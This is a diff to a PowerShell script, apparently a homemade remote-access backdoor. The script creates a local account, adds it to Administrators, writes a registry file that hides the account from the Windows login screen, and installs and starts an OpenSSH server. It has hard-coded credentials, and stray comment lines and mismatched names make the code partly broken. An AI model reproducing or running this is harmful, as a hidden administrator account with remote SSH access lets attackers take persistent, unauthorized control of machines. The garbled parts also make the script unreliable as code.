@@ -24,16 +24,27 @@ function create_account {
         process {
             New-Location "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
             write-Verbose "$uname local user created" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
-            Write-Verbose "$uname added to  teh local administration group"
+            
         }
         end{  
         }
 
     }
-$uname = "DarkSauron"
-$pword = (ConvertTo-Securestring "12192003"-AsPlainText -Force)
+
+#create admin user
+$uname = "WindowsGuest"
+$pword = (ConvertTo-Securestring "rat123"-AsPlainText -Force)
 create_account  -uname $uname -pword $pword
 
+#registry  to hide local admin
+$registry_name = random_text
+(
+    echo Windows Registry Editior Version 5.00
+
+    echo
+    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
+    echo "DarkSauron"=dword:00000000;
+) > "$registry_name.reg"
 
 
 #varaibles
@@ -41,7 +52,7 @@ create_account  -uname $uname -pword $pword
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
-
+ // watch the video from the timeline 34:00 
 
 
 
@@ -69,5 +80,5 @@ Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Nam
 
 
 
-
+i am happy  to do the same thing again and agian
 
